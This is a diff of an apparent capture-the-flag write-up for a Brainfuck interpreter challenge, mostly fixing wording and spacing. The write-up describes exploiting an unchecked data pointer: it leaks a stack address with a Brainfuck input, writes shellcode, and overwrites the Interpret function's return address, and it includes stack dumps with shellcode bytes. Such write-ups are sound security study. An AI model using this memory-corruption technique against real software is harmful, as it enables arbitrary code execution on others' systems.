@@ -64,18 +64,18 @@ Brainfuck uses the following variables.
 ```
 ip:     Instruction pointer
 ip_end: End position of instruction pointer
-mp:     Memory pointer
+mp:     Data pointer
 brack:  Flag to check the number before and after the bracket
 ```
 
-Since the range of the value of `mp` is not checked when executing the Brainfuck code, I can read the value on the stack and write arbitrary data by specifying the following character string.
+Since the range of the value of data pointer`mp` is not checked when executing the Brainfuck code, I can read the value on the stack and write arbitrary data by specifying the following character string.
 ```
 .,[>.,]
 ```
 
 ## Solution:
 
-First I used `., [>.,]` To leak the stack address (mp = 0 address).
+First I used `.,[>.,]` To leak the stack address (mp = 0 address).
 
 ```
 0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
@@ -86,7 +86,7 @@ First I used `., [>.,]` To leak the stack address (mp = 0 address).
 0x7fffffffde00:	0x0000555555555700	0x00007ffff7a03bf7
 ```
 
-Then I used `, [>,]` to write the shellcode and then change the return address of the `Interpret` function to the leaked stack address.
+Then I used `,[>,]` to write the shellcode and then change the return address of the `Interpret` function to the leaked stack address.
 
 ```
 0x7fffffffd5d0:	0x622fb84852d23148	0x485068732f2f6e69  <--- shellcode
